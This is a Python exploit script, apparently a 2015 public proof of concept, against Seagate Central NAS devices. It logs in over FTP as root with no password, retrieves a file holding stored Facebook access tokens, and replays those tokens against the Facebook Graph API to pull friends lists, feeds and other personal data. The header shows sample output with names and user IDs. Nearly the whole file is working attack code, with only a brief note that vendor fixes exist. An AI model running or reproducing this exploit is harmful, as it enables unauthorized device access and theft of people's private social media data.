#!/usr/bin/python
# seagate_central_facebook.py
#
# Seagate Central Remote Facebook Access Token Exploit
#
# Jeremy Brown [jbrown3264/gmail]
# May 2015
#
# -Synopsis-
#
# Seagate Central stores linked Facebook account access tokens in /etc/archive_accounts.ser
# and this exploit takes advantage of two bugs:
#
# 1) Passwordless root login via FTP to retrieve archive_accounts.ser file which contains access tokens
# 2) Reuses the unencrypted and unprotected (-rw-r--r--) access tokens for a chosen scope to return data
#
# -Example-
#
# > seagate_fb_accounts.py getaccesstoken 1.2.3.4
#
# 'archive_accounts.ser'
#
# a:1:{s:8:"facebook";a:1:{s:29:"user3535@facebook.com";a:5:{s:7:"service";s:8:"facebook";s:4:
# "user";s:29:"user3535@facebook.com";s:5:"owner";s:4:"test";s:6:"folder";s:7:"private";s:5:"t
# oken";s:186:"CAAxxxxxxxx..."
# ;}}}
#
# Next, try this:
#
# > seagate_fb_accounts.py CAAxxxxxxxx... friends
# server response:
#
# {'data': [{'name': 'Jessie Taylor', 'id': '100000937485968'}, {'name': 'Kellie Youty', 'id': '1
# 00000359801427'}, {'name': 'Hope Maynard', 'id': '10000102938470'}, {'name': 'Angel Tucker Pole', 'id'
# : '100001402808867'}, {'name': 'Malcolm Vance', 'id': '10000284629187'}, {'name': 'Tucker Civile', 'id':
# .....
#
# Scopes Reference: https://developers.facebook.com/docs/graph-api/reference/v2.1/user
#
# -Fixes-
#
# Seagate scheduled updates to go live on April 28th, 2015.
#
# Tested version: 2014.0410.0026-F
#

import sys
import json
from urllib import request # python3
from ftplib import FTP

fb_url = "https://graph.facebook.com"
fb_filename = "archive_accounts.ser"

def getaccesstoken(host):
    try:
        ftp = FTP(host)
        ftp.login("root")
        ftp.retrbinary("RETR " + "/etc/" + fb_filename, open(fb_filename, 'wb').write)
        ftp.close()
    
    except Exception as error:
        print("Error: %s" % error)
        return

    try:
        with open(fb_filename, 'r') as file:
            data = file.read()

    except Exception as error:
        print("Error: %s" % error)
        return

    print("\n'%s'\n\n%s\n\n" % (fb_filename, data))

    return

def main():
    if(len(sys.argv) < 2):
        print("Usage: %s <key> <scope> OR getaccesstoken <host>\n" % sys.argv[0])
        print("scopes: albums feed friends likes picture posts television")
        return

    if(sys.argv[1] == "getaccesstoken"):
        if(len(sys.argv) == 3):
            host = sys.argv[2]

            res = getaccesstoken(host)
        
        else:
            print("Error: need host to retrieve access token file\n")
            return

    else:
        key = sys.argv[1]
    
        if(len(sys.argv) == 3):
            scope = sys.argv[2]
        else:
            scope = ""

        try:
            response = request.urlopen(fb_url + "/me/" + scope + "?access_token=" + key).read()

        except Exception as error:
            print("Error: %s" % error)
            return

        data = json.loads(response.decode('utf-8'))

        print("server response:\n\n%s\n" % data)

    return

if __name__ == "__main__":
    main()
